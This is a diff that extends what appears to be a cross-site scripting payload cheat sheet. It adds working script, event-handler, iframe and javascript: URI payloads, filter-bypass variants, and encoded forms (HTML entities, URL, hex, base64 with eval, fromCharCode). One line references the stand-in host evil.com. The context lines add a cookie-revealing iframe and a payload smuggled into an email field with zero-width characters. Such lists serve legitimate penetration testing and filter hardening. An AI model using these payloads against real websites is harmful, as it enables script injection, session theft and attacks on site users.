@@ -1,3 +1,33 @@
+<script>prompt(1)</script>
+"><script>prompt(1)</script>
+<img src=x onerror=prompt(1)>
+<svg/onload=prompt(1)>
+<body onload=prompt(1)>
+<iframe src="javascript:prompt(1)"></iframe>
+<a href="javascript:prompt(1)">Click Me</a>
+Filter Bypasses:
+<scr<script>ipt>prompt(1)</script>
+<img src=x oneonerrorrror=prompt(1)>
+<svg><script>prompt(1)</script></svg>
+<math><mtext><!—><script>prompt(1)</script>
+<a href="JaVaScRiPt:prompt(1)">Click</a>
+<iframe src=//evil.com/onload=prompt(1)>
+HTML Entities:
+&#x3C;script&#x3E;prompt(1)&#x3C;/script&#x3E;
+<script>prompt(1)</script>
+URL Encoding:
+%3Cscript%3Eprompt(1)%3C/script%3E
+javascript%3Aprompt(1)
+Hex Encoding:
+<script>\x70\x72\x6F\x6D\x70\x74(1)</script>
+Base64 Encoding (requires eval(atob())):
+<script>eval(atob('cHJvbXB0KDEp'))</script>
+JS Eval Bypass: 🔸eval(String.fromCharCode(112,114,111,109,112,116,40,49,41))
+Comment Bypass:
+ja<!-- -->vascript:prompt(1)
+<script>/*Hey*/prompt(1)//</script>
+CSS Injection:
+<style>*{color:red}</style><svg/onload=prompt(1)>
 <a href="javascript​:alert(22)">a</a>
 validemail+test<h1/onmouseover​=alert(origin)>test@gmail.com
 <iframe src="javascript:alert(document.cookie)"></iframe>
